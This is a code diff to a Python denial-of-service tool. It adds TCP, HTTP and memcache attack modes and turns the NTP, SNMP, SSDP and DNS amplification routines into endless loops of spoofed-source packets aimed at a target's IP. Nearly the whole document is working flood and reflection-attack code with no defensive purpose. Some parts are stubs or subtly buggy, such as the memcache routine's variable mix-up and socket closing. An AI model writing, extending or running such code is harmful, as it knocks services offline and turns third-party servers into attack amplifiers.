@@ -1,3 +1,4 @@
+import re
 import sys
 import time
 import socket
@@ -5,6 +6,8 @@ import random
 import signal
 import struct
 import threading
+
+import requests
 import scapy.layers.inet
 from pinject import IP, UDP
 from scapy.sendrecv import send
@@ -47,12 +50,15 @@ class ATTACK:
             #     t.start()
             signal.signal(signal.SIGINT, on_signal)
             {
-                1: self.udp_flood,
-                2: self.icmp_flood,
-                3: self.ntp_amplification,
-                4: self.snmp_amplification,
-                5: self.ssdp_amplification,
-                6: self.dns_amplification
+                1: self.tcp_flood,
+                2: self.udp_flood,
+                3: self.icmp_flood,
+                4: self.http_flood,
+                5: self.ntp_amplification,
+                6: self.snmp_amplification,
+                7: self.ssdp_amplification,
+                8: self.dns_amplification,
+                9: self.memcache_amplification,
             }[self.args.type]()
         except Exception as err:
             print('\nError:', str(err))
@@ -62,7 +68,7 @@ class ATTACK:
     def show_stats(self):
         attack = (
             '     Duration  '
-            '|    Sent       '
+            '|     Sent      '
             '|    Traffic    '
             '|    Packet/s   '
             '|     Bit/s     '
@@ -81,6 +87,9 @@ class ATTACK:
             print('\r{}{}'.format(out, ' '*(75-len(out))), end='', flush=True)
             time.sleep(1)
 
+    def tcp_flood(self):  # TODO: TCP Flood
+        pass
+
     def udp_flood(self):
         print('\n' + ' ' * 23 + 'UDP Flooding on %s:%d\n' % (self.args.target_ip, self.args.target_port))
         t = threading.Thread(target=self.show_stats, daemon=True)
@@ -94,12 +103,26 @@ class ATTACK:
             self.bytes = self.bytes + payload_bytes
 
     def icmp_flood(self):
+        print('\n' + ' ' * 23 + 'ICMP Flooding on %s\n' % self.args.target_ip)
+        t = threading.Thread(target=self.show_stats, daemon=True)
+        t.start()
         packet = scapy.layers.inet.IP(dst=self.args.target_ip) / scapy.layers.inet.ICMP()
         packet_bytes = len(packet)
         while True:
             send(packet, verbose=False)
             self.packets = self.packets + 1
             self.bytes = self.bytes + packet_bytes
+
+    def http_flood(self):  # TODO: HTTP Flood
+        print('\n' + ' ' * 23 + 'HTTP Flooding on %s\n' % self.args.target_ip)
+        t = threading.Thread(target=self.show_stats, daemon=True)
+        t.start()
+        m = re.search(r'http://([^/]*)/?.*', self.args.target_ip)
+        host = m.group(1)
+        while True:
+            r = requests.get(self.args.target_ip)
+            self.packets = self.packets + 1
+            self.bytes = self.bytes + len(r.content)
 
     # def sock_stress(self):
     #     # Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
@@ -121,13 +144,14 @@ class ATTACK:
             ntp_server = ntp_server.strip()
             if ntp_server != "":
                 ntp_server_list.append(ntp_server)
-        for ntp_server in ntp_server_list:
-            udp = UDP(random.randint(1, 65535), 123, payload).pack(self.args.target_ip, ntp_server)
-            ip = IP(self.args.target_ip, ntp_server, udp, proto=socket.IPPROTO_UDP).pack()
-            sock.sendto(ip + udp + payload, (ntp_server, 123))
-            # send(scapy.layers.inet.IP(dst=self.args, src=self.args.target_ip) /
-            #      (UDP(sport=52816) /
-            #       NTP(version=2, mode=7, stratum=0, poll=3, precision=42)))
+        while True:  # TODO: add ntp_amplification multi-thread
+            for ntp_server in ntp_server_list:
+                udp = UDP(random.randint(1, 65535), 123, payload).pack(self.args.target_ip, ntp_server)
+                ip = IP(self.args.target_ip, ntp_server, udp, proto=socket.IPPROTO_UDP).pack()
+                sock.sendto(ip + udp + payload, (ntp_server, 123))
+                # send(scapy.layers.inet.IP(dst=self.args, src=self.args.target_ip) /
+                #      (UDP(sport=52816) /
+                #       NTP(version=2, mode=7, stratum=0, poll=3, precision=42)))
 
     def snmp_amplification(self):
         print('\n' + ' ' * 23 + 'SNMP Reflecting on %s:%d\n' % (self.args.target_ip, 161))
@@ -141,10 +165,11 @@ class ATTACK:
             snmp_server = snmp_server.strip()
             if snmp_server != "":
                 snmp_server_list.append(snmp_server)
-        for snmp_server in snmp_server_list:
-            udp = UDP(random.randint(1, 65535), 161, payload).pack(self.args.target_ip, snmp_server)
-            ip = IP(self.args.target_ip, snmp_server, udp, proto=socket.IPPROTO_UDP).pack()
-            sock.sendto(ip + udp + payload, (snmp_server, 161))
+        while True:  # TODO: add snmp_amplification multi-thread
+            for snmp_server in snmp_server_list:
+                udp = UDP(random.randint(1, 65535), 161, payload).pack(self.args.target_ip, snmp_server)
+                ip = IP(self.args.target_ip, snmp_server, udp, proto=socket.IPPROTO_UDP).pack()
+                sock.sendto(ip + udp + payload, (snmp_server, 161))
 
     def ssdp_amplification(self):
         print('\n' + ' ' * 23 + 'SSDP Reflecting on %s:%d\n' % (self.args.target_ip, 1900))
@@ -156,10 +181,11 @@ class ATTACK:
             ssdp_server = ssdp_server.strip()
             if ssdp_server != "":
                 ssdp_server_list.append(ssdp_server)
-        for ssdp_server in ssdp_server_list:
-            udp = UDP(random.randint(1, 65535), 1900, payload).pack(self.args.target_ip, ssdp_server)
-            ip = IP(self.args.target_ip, ssdp_server, udp, proto=socket.IPPROTO_UDP).pack()
-            sock.sendto(ip + udp + payload, (ssdp_server, 1900))
+        while True:  # TODO: add ssdp_amplification multi-thread
+            for ssdp_server in ssdp_server_list:
+                udp = UDP(random.randint(1, 65535), 1900, payload).pack(self.args.target_ip, ssdp_server)
+                ip = IP(self.args.target_ip, ssdp_server, udp, proto=socket.IPPROTO_UDP).pack()
+                sock.sendto(ip + udp + payload, (ssdp_server, 1900))
 
 
     def get_qname(self, domain):
@@ -186,8 +212,29 @@ class ATTACK:
             domain = domain.strip()
             if domain != "":
                 domain_list.append(domain)
-        for domain in domain_list:
-            payload = self.get_dns_query(domain)
-            udp = UDP(random.randint(1, 65535), 53, payload).pack(self.args.target_ip, domain)
-            ip = IP(self.args.target_ip, domain, udp, proto=socket.IPPROTO_UDP).pack()
-            sock.sendto(ip + udp + payload, (domain, 53))
+        while True:  # TODO: add dns_amplification multi-thread
+            for domain in domain_list:
+                payload = self.get_dns_query(domain)
+                udp = UDP(random.randint(1, 65535), 53, payload).pack(self.args.target_ip, domain)
+                ip = IP(self.args.target_ip, domain, udp, proto=socket.IPPROTO_UDP).pack()
+                sock.sendto(ip + udp + payload, (domain, 53))
+
+    def memcache_amplification(self):
+        MESSAGE = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        memcache_server_list = []
+        for memcache_server in open(self.args.file, "r"):
+            snmp_server = memcache_server.strip()
+            if memcache_server != "":
+                memcache_server_list.append(memcache_server)
+        while True:  # TODO: add memcache_amplification multi-thread
+            for memcache_server in memcache_server_list:
+                sock.sendto(MESSAGE, (memcache_server, 11211))
+                data, addr = sock.recvfrom(1024)
+                sock.close()
+                if len(data) > len(MESSAGE):  # vulnerable
+                    ip = scapy.layers.inet.IP(src=self.args.target_ip, dst=memcache_server)
+                    udp = scapy.layers.inet.UDP(sport=self.args.target_port, dport=11211)
+                    req = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
+                    pck = ip / udp / req
+                    send(pck)
